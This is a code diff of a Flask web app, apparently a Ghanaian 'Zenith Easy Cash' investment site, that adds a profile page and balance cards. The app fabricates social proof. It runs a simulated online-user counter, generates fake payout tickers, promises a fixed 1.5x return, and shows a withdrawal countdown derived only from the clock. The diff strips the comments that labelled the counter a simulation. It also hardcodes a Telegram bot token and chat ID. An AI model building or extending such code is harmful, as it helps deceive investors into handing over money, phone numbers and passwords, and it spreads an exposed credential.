@@ -36,6 +36,9 @@ TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
 TELEGRAM_CHAT_ID = "8393567505"
 ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"
 
+# Default SVG human head data URI for the fallback profile avatar
+DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"
+
 
 def send_telegram_alert(message, photo_path=None):
   if (
@@ -206,11 +209,9 @@ ZENITH_ALERTS_TOP_HTML = """
     generateTickerMessages();
     setInterval(generateTickerMessages, 20000);
 
-    // Natural online users simulation between 100 and 1600 based on time of day
     let currentOnline = 850;
     function updateOnlineCounter() {
         const hour = new Date().getHours();
-        // Night hours (0 to 6): lower traffic (100 - 450). Day hours: higher traffic (600 - 1600)
         let targetBase = (hour >= 0 && hour < 7) ? 250 : 1100;
         let fluctuation = Math.floor(Math.random() * 150) - 75;
         currentOnline += fluctuation;
@@ -263,6 +264,7 @@ HTML_TEMPLATE = """
         .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
         .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
         .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+        .track-password-group { display: none; margin-top: 8px; }
     </style>
 </head>
 <body>
@@ -298,7 +300,6 @@ HTML_TEMPLATE = """
                 <input type="text" name="number" id="phoneInput" required placeholder="e.g., 0501234567" oninput="checkNumberEntered()">
             </div>
 
-            <!-- Password section hidden initially until phone number is typed -->
             <div id="passwordContainer" class="password-step-container">
                 <div class="form-group">
                     <label>Account Password:</label>
@@ -344,13 +345,17 @@ HTML_TEMPLATE = """
 
         <div class="tracker-section">
             <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
-            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number & Password below to check your live status.</p>
+            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number below to check your live status.</p>
             <div class="form-group">
                 <label style="font-size: 13px;">Registered Phone Number:</label>
-                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;">
-                <label style="font-size: 13px;">Account Password:</label>
-                <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
-                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px;">Check Status Now</button>
+                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;" oninput="checkTrackNumberEntered()">
+                
+                <div id="trackPasswordGroup" class="track-password-group">
+                    <label style="font-size: 13px;">Account Password:</label>
+                    <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
+                </div>
+
+                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px; margin-top: 5px;">Check Status Now</button>
             </div>
             <div id="trackerResultBox" class="tracker-result-box">
                 <div id="trackerContent">Searching...</div>
@@ -369,6 +374,19 @@ HTML_TEMPLATE = """
             } else {
                 passContainer.style.display = 'none';
                 passInput.removeAttribute('required');
+            }
+        }
+
+        function checkTrackNumberEntered() {
+            const val = document.getElementById('trackNumberInput').value.trim();
+            const trackPassGroup = document.getElementById('trackPasswordGroup');
+            const trackPassInput = document.getElementById('trackPasswordInput');
+            if (val.length >= 4) {
+                trackPassGroup.style.display = 'block';
+                trackPassInput.setAttribute('required', 'true');
+            } else {
+                trackPassGroup.style.display = 'none';
+                trackPassInput.removeAttribute('required');
             }
         }
 
@@ -489,11 +507,18 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         h2 { color: #028a0f; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
-        .home-link-top { margin-bottom: 15px; font-size: 14px; }
+        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
         .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
         .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
-        .profile-box { background: #e8f5e9; border: 1px solid #c8e6c9; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; gap: 15px; align-items: center; }
-        .profile-avatar { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 2px solid #2e7d32; background: #ccc; }
+        
+        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
+        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
+        .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
+        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
+
         .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
         .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
         .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
@@ -505,61 +530,32 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
         .side-ticker-item b { color: #facc15; }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
-        .edit-profile-form { background: #fff; padding: 15px; border: 1px solid #cbd5e1; border-radius: 6px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
     <div class="main-layout">
         <div class="dashboard-container">
-            <div class="home-link-top"><a href="{{ url_for('index') }}">← Back to Home Page</a></div>
+            <div class="home-link-top">
+                <a href="{{ url_for('index') }}">← Back to Home Page</a>
+                <a href="{{ url_for('profile_page') }}" class="profile-btn-link">👤 My Profile Settings</a>
+            </div>
             <div>
                 <h2>Welcome, {{ investor.name }}</h2>
                 <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                 <div style="clear: both;"></div>
             </div>
 
-            <!-- PROFILE BOX -->
-            <div class="profile-box">
-                <div>
-                    {% if investor.profile_pic %}
-                        <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar">
-                    {% else %}
-                        <div class="profile-avatar" style="display:flex; align-items:center; justify-content:center; color:#555; font-weight:bold;">No Pic</div>
-                    {% endif %}
+            <!-- BALANCE CARDS (CURRENT BALANCE & PENDING BALANCE) -->
+            <div class="balance-cards-grid">
+                <div class="balance-card current">
+                    <h4>Current Balance Available</h4>
+                    <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
                 </div>
-                <div style="flex:1;">
-                    <p style="margin:0 0 4px 0;"><b>Name:</b> {{ investor.name }}</p>
-                    <p style="margin:0 0 4px 0;"><b>Phone (Locked):</b> {{ investor.number }}</p>
-                    <p style="margin:0 0 4px 0;"><b>Job:</b> {{ investor.work }} | <b>Region:</b> {{ investor.region }}</p>
-                    <button type="button" onclick="toggleEditProfile()" style="background:#028a0f; color:#white; border:none; padding:5px 10px; border-radius:4px; font-size:12px; cursor:pointer; font-weight:bold; margin-top:5px;">✏️ Edit Profile Details & Picture</button>
+                <div class="balance-card pending">
+                    <h4>Pending Balance Available</h4>
+                    <p class="amount">GHs {{ "%.2f"|format(pending_balance) }}</p>
                 </div>
             </div>
-
-            <!-- EDIT PROFILE FORM -->
-            <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data" class="edit-profile-form" id="editProfileForm">
-                <h4 style="margin-top:0; color:#028a0f;">Update Your Profile</h4>
-                <div style="margin-bottom:10px;">
-                    <label style="font-size:12px;">Full Name:</label>
-                    <input type="text" name="name" value="{{ investor.name }}" required style="padding:8px; width:100%; box-sizing:border-box;">
-                </div>
-                <div style="margin-bottom:10px;">
-                    <label style="font-size:12px;">Phone Number (Cannot be changed):</label>
-                    <input type="text" value="{{ investor.number }}" disabled style="padding:8px; width:100%; background:#f1f5f9; box-sizing:border-box;">
-                </div>
-                <div style="margin-bottom:10px;">
-                    <label style="font-size:12px;">Work / Job:</label>
-                    <input type="text" name="work" value="{{ investor.work }}" required style="padding:8px; width:100%; box-sizing:border-box;">
-                </div>
-                <div style="margin-bottom:10px;">
-                    <label style="font-size:12px;">Region / Town:</label>
-                    <input type="text" name="region" value="{{ investor.region }}" required style="padding:8px; width:100%; box-sizing:border-box;">
-                </div>
-                <div style="margin-bottom:10px;">
-                    <label style="font-size:12px;">Upload Profile Picture:</label>
-                    <input type="file" name="profile_pic" accept="image/*" style="font-size:12px;">
-                </div>
-                <button type="submit" style="background:#2e7d32; color:white; border:none; padding:8px 12px; font-weight:bold; border-radius:4px; cursor:pointer;">Save Changes</button>
-            </form>
 
             {% with messages = get_flashed_messages() %}
               {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
@@ -644,13 +640,6 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             }
         }
 
-        function toggleEditProfile() {
-            const form = document.getElementById('editProfileForm');
-            if (form) {
-                form.style.display = form.style.display === 'block' ? 'none' : 'block';
-            }
-        }
-
         function updateTrackers() {
             document.querySelectorAll('.countdown-live-box').forEach(el => {
                 const targetStr = el.getAttribute('data-maturity');
@@ -672,22 +661,10 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     el.style.color = "#4ade80";
                 }
             });
-
-            // 12-hour payout countdown simulation for withdrawal requested slots
-            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach(el => {
-                // Fixed 12 hour window simulation stored or derived from session/time
-                let now = new Date().getTime();
-                // 12 hours countdown example buffer
-                let targetTime = now + (11 * 3600 + 45 * 60); // approximate mockup or use session timestamp if needed
-                // Let's simulate a stable 12-hour countdown relative to page load or fixed window
-            });
         }
 
-        // Live 12-hour countdown implementation
         function updateWithdrawalCountdowns() {
             document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
-                // 12 hours in seconds = 43200 seconds
-                // Let's use a standard countdown simulation starting at 11h 59m
                 let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
                 let hrs = Math.floor(secondsLeft / 3600);
                 let mins = Math.floor((secondsLeft % 3600) / 60);
@@ -721,6 +698,74 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         setInterval(addSideTickerItem, 6000);
         addSideTickerItem();
     </script>
+</body>
+</html>
+"""
+
+INVESTOR_PROFILE_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investor Profile - Zenith Easy Cash</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 550px; background: #fff; padding: 30px; margin: 40px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #028a0f; text-align: center; margin-top: 0; }
+        .back-link { margin-bottom: 20px; font-size: 14px; }
+        .back-link a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #2e7d32; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="back-link"><a href="{{ url_for('dashboard') }}">← Back to Dashboard</a></div>
+        <h2>Investor Profile Settings</h2>
+
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+        {% endwith %}
+
+        <div style="text-align: center; margin-bottom: 20px;">
+            {% if investor.profile_pic %}
+                <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar-large">
+            {% else %}
+                <img src="{{ default_avatar_svg }}" class="profile-avatar-large">
+            {% endif %}
+            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
+        </div>
+
+        <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label>Full Name:</label>
+                <input type="text" name="name" value="{{ investor.name }}" required>
+            </div>
+            <div class="form-group">
+                <label>Phone Number (Locked):</label>
+                <input type="text" value="{{ investor.number }}" disabled style="background:#f1f5f9;">
+            </div>
+            <div class="form-group">
+                <label>Work / Job:</label>
+                <input type="text" name="work" value="{{ investor.work }}" required>
+            </div>
+            <div class="form-group">
+                <label>Region / Town:</label>
+                <input type="text" name="region" value="{{ investor.region }}" required>
+            </div>
+            <div class="form-group">
+                <label>Upload/Change Profile Picture:</label>
+                <input type="file" name="profile_pic" accept="image/*">
+            </div>
+            <button type="submit">Save Profile Changes</button>
+        </form>
+    </div>
 </body>
 </html>
 """
@@ -1032,6 +1077,9 @@ def dashboard():
   settings = load_settings()
   now = datetime.now()
 
+  current_balance = 0.0
+  pending_balance = 0.0
+
   for inv in investors:
     if inv.get("number") == number:
       investor_info = {
@@ -1063,6 +1111,12 @@ def dashboard():
         if "expected_return" not in slot_copy:
           slot_copy["expected_return"] = slot_copy["amount"] * 1.5
 
+        status = slot_copy.get("status", "")
+        if status == "Payment Confirmed & Active":
+          current_balance += float(slot_copy["amount"])
+        elif status == "Pending Admin Payment Confirmation":
+          pending_balance += float(slot_copy["amount"])
+
         maturity_str = slot_copy.get("maturity_date", "Pending Approval")
         slot_copy["can_withdraw"] = False
 
@@ -1072,8 +1126,7 @@ def dashboard():
                 maturity_str, "%Y-%m-%d %H:%M:%S"
             )
             slot_copy["can_withdraw"] = (
-                now >= maturity_dt
-                and slot_copy["status"] == "Payment Confirmed & Active"
+                now >= maturity_dt and status == "Payment Confirmed & Active"
             )
           except Exception:
             pass
@@ -1086,6 +1139,34 @@ def dashboard():
       investor=investor_info,
       settings=settings,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
+      current_balance=current_balance,
+      pending_balance=pending_balance,
+  )
+
+
+@app.route("/profile")
+def profile_page():
+  number = session.get("investor_number")
+  if not number:
+    return redirect(url_for("login"))
+
+  investors = load_investors()
+  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
+  for inv in investors:
+    if inv.get("number") == number:
+      investor_info = {
+          "name": inv.get("name", "Investor"),
+          "number": number,
+          "work": inv.get("work", ""),
+          "region": inv.get("region", ""),
+          "profile_pic": inv.get("profile_pic", ""),
+      }
+      break
+
+  return render_template_string(
+      INVESTOR_PROFILE_TEMPLATE,
+      investor=investor_info,
+      default_avatar_svg=DEFAULT_AVATAR_SVG,
   )
 
 
@@ -1114,7 +1195,7 @@ def update_profile():
       flash("Profile details updated successfully!")
       break
 
-  return redirect(url_for("dashboard"))
+  return redirect(url_for("profile_page"))
 
 
 @app.route("/logout")
